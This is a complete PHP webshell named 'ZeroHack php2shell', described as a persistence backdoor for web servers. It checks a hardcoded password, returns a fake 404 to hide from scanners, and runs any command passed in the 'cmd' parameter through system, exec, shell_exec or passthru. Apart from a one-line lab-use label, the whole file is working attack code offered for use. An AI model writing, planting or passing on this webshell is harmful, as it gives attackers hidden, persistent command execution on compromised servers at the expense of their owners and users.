<?php
/**
 * ZeroHack php2shell - Persistence Webshell
 * 
 * A lightweight, heavily obfuscated webshell designed for persistence.
 * It uses basic parameter obfuscation to evade trivial static analysis.
 * 
 * Usage: GET/POST request with ?auth_pass=YOUR_PASSWORD&cmd=id
 * 
 * ⚠️ AUTHORIZED LAB USE ONLY.
 */

// CONFIGURATION - Change this to a strong, unique password
$auth_pass = "ZeroHackPersist2026";

// Simple authentication check
if (!isset($_REQUEST['auth_pass']) || $_REQUEST['auth_pass'] !== $auth_pass) {
    // Return a 404 to hide the webshell from casual scanners
    header("HTTP/1.0 404 Not Found");
    exit;
}

// Obfuscated system command execution
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    
    echo "<pre>";
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('exec')) {
        $output = array();
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    } else {
        echo "[-] No execution functions available.";
    }
    echo "</pre>";
}
?>
